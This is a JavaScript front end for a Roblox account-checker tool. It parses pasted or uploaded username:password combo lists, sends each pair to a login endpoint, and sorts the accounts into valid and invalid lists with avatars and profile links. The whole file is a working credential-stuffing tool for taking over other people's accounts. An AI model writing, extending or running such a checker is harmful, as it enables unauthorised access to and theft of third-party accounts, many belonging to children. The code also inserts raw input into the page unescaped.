let app = document.getElementById('app');
let userName = localStorage.getItem('username') || null;
let format = { site: -1, username: -1, password: -1 };
let parsedLines = [];
let valid = [], invalid = [];
let checkingCount = 0;

function renderNameScreen() {
  app.innerHTML = `
    <div class="name-screen">
      <h1>Enter your name...</h1>
      <input id="nameInput" placeholder="Enter your name..." autocomplete="off">
      <button onclick="saveName()">Continue</button>
    </div>
  `;
  document.getElementById('nameInput').addEventListener('keydown', e => {
    if(e.key === 'Enter') saveName();
  });
}

function saveName() {
  const name = document.getElementById('nameInput').value.trim();
  if (name) {
    localStorage.setItem('username', name);
    userName = name;
    renderMainScreen();
  }
}

function renderMainScreen() {
  app.innerHTML = `
    <div class="main-screen">
      <h1>Hello, <span class="green">${userName}</span></h1>
      <textarea id="credInput" rows="8" cols="50" placeholder="Paste your credentials here..."></textarea><br>
      <input type="file" id="fileInput"><br>
      <button onclick="previewData()">Preview & Assign Format</button>
      <div id="previewArea"></div>
      <div id="siteSelect" class="hidden">
        <h2>Site: <img src="https://www.roblox.com/favicon.ico" style="width:20px;vertical-align:middle;"> Roblox</h2>
        <button onclick="validateCredentials()">Validate Credentials</button>
        <div id="progress"></div>
      </div>
      <div id="results"></div>
    </div>
  `;
  document.getElementById('fileInput').addEventListener('change', () => previewData());
}

function previewData() {
  let input = document.getElementById('credInput').value.trim();
  const file = document.getElementById('fileInput').files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      input = e.target.result;
      processPreview(input);
    };
    reader.readAsText(file);
  } else {
    processPreview(input);
  }
}

function processPreview(data) {
  parsedLines = data.split('\n').filter(line => line.includes(':') || line.includes(',') || line.includes('|'));
  if (parsedLines.length === 0) return alert('No valid lines found.');

  const delimiter = parsedLines[0].includes(':') ? ':' :
                    parsedLines[0].includes(',') ? ',' : '|';

  const firstFew = parsedLines.slice(0, 3);
  let previewHTML = `<h2>Assign Format:</h2>`;

  const firstTokens = firstFew[0].split(delimiter);

  previewHTML += `<div class="preview-line">`;
  firstTokens.forEach((token, idx) => {
    previewHTML += `
      <div style="display: inline-block; margin: 5px;">
        <div class="token">${token}</div>
        <select onchange="setFormat(${idx}, this.value)">
          <option value="">None</option>
          <option value="username">Username</option>
          <option value="password">Password</option>
          <option value="site">Site</option>
        </select>
      </div>
    `;
  });
  previewHTML += `</div>`;
  previewHTML += `<pre style="margin-top:1rem; text-align:left;">${firstFew.join('\n')}</pre>`;

  document.getElementById('previewArea').innerHTML = previewHTML;
  document.getElementById('siteSelect').classList.remove('hidden');
}

function setFormat(index, role) {
  for (let key in format) {
    if (format[key] === index) format[key] = -1;
  }
  if (role) {
    format[role] = index;
  }
}

async function validateCredentials() {
  if (format.username === -1 || format.password === -1) {
    return alert('Please assign Username and Password fields.');
  }

  valid = [];
  invalid = [];
  checkingCount = 0;
  document.getElementById('results').innerHTML = '';
  document.getElementById('progress').innerText = `Checked: 0 / ${parsedLines.length}`;

  for (const line of parsedLines) {
    const delimiter = line.includes(':') ? ':' : line.includes(',') ? ',' : '|';
    const parts = line.split(delimiter);
    const username = parts[format.username]?.trim();
    const password = parts[format.password]?.trim();

    if (!username || !password) continue;

    const result = await checkRobloxCredentials(username, password);
    checkingCount++;
    document.getElementById('progress').innerText = `Checked: ${checkingCount} / ${parsedLines.length}`;

    if (result.success) {
      valid.push(result);
    } else {
      invalid.push({ username, password });
    }
    renderResults(valid, invalid);
  }
}

async function checkRobloxCredentials(username, password) {
  try {
    const res = await fetch('/api/roblox-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();
    if (data.success) {
      return { username: data.username, password, userId: data.userId, success: true };
    } else {
      return { username, password, success: false };
    }
  } catch (err) {
    console.error(err);
    return { username, password, success: false };
  }
}

function renderResults(validArr, invalidArr) {
  let html = `<h2>✅ Valid Accounts</h2>`;
  if (validArr.length === 0) html += `<p>No valid accounts yet.</p>`;
  validArr.forEach(user => {
    html += resultCard(user, 'green');
  });

  html += `<h2>❌ Invalid Accounts</h2>`;
  if (invalidArr.length === 0) html += `<p>No invalid accounts yet.</p>`;
  invalidArr.forEach(user => {
    html += resultCard(user, 'red');
  });

  document.getElementById('results').innerHTML = html;
}

function resultCard(user, colorClass) {
  return `
    <div class="result-card" style="border: 2px solid ${colorClass}; padding: 10px; margin: 10px; display:flex; align-items:center; gap: 15px; border-radius: 8px;">
      <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${user.userId || 0}&width=50&height=50&format=png" alt="Avatar" style="border-radius: 50%; width: 50px; height: 50px;">
      <div>
        <a href="https://www.roblox.com/users/${user.userId || '#'} /profile" target="_blank" style="color:${colorClass}; font-weight: bold; font-family: monospace;">
          ${user.username}
        </a><br>
        <span class="password" style="font-family: monospace; user-select: all; cursor: pointer;" title="Click to toggle visibility" onclick="togglePasswordVisibility(this)">••••••••</span>
      </div>
    </div>
  `;
}

function togglePasswordVisibility(el) {
  if (el.innerText === '••••••••') {
    el.innerText = el.previousSibling.previousSibling?.innerText || 'password';
  } else {
    el.innerText = '••••••••';
  }
}

userName ? renderMainScreen() : renderNameScreen();
